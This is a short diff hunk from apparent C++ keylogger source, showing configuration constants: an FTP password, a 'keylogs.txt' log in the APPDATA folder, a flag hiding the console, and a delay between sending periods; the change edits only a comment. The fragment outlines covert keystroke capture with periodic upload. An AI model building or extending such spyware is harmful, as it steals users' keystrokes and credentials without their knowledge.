@@ -17,7 +17,7 @@ const string FTP_PASSWORD = "";
 const string FILE_NAME = "keylogs.txt";
 const string LOGS_FILE_PATH = string(getenv("APPDATA")) + "\\" + FILE_NAME;
 
-// console display (off=default)
+// console display
 bool noConsole = true;
 
 // delay between sending periods (measured: milliseconds)
